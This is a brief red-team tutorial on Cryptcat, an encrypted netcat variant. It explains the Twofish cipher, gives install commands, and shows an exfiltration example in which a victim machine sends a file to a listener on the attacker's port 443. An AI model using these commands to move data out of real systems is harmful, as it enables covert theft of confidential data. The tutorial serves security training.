> `Cryptcat` is the standard `netcat` enhanced with `twofish` `encryption` with ports for WIndows NT, BSD and Linux. Twofish is courtesy of `counterpane`, and `cryptix`.

> Cryptcat is a simple Unix utility which reads and writes data across network connections, using `TCP` or `UDP` protocol while `encrypting` the data being transmitted. It is designed to be a reliable `"back-end"` tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network `debugging` and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. 

### <span style="color:green"> __Secure Transfer__ </span>

> There are several reasons why we should use `Cryptcat`, one of them is because of its `TwoFish` cipher developed by `Counterpane Labs`. 

> As you can imagine, in a `red team` compromise, you may encounter `private` / `confidential` data, which can be of `much` value to a red team (not to mention cybercriminals), when doing `data exfiltration`, you have to be `sure` of how you are going to operate, you have to keep in mind that there may also be a third party `intercepting` your connection, A perfect reference is when you use `TunnelShell` to create a covert channel, you are not `encrypting` any kind of connection, if somehow, some third party manages to find that connection, they could `monitor` you and `steal` your data at the same time you do the `exfiltration`, which would be devastating. That is why cryptography is used in any kind of connection.

> Twofish is a `symmetric` cryptography method with `block` encryption. The block size in Twofish is `128 bits` and the key size can go up to `256 bits`.

> Designed by `Bruce Schneier`, `John Kelsey`, `Doug Withing`, `David Wagner`, `Chris Hall` and `Niels Ferguson`.

> The distinguishing features of Twofish are the use of `precomputed` `S-boxes` with `dependent` keys and a relatively complex `key-schedule`. 

### <span style="color:green">__Install__</span>

```
sudo apt-get update
sudo apt-get install cryptcat 
```

### <span style="color:green"> __CryptCat Usage__ </span>

> Now let's see how to use Cryptcat, for this example we will simply transfer a file.

> Attacker Machine
 
```
cryptcat -l -p 443 -n > file
```

> Victim Mahcine

```
cryptcat <ip> 443 < file
```


> `-l` / listen mode, for inbound connects

> `-P` / local port number

> `-n` / numeric-only IP addresses, no DNS
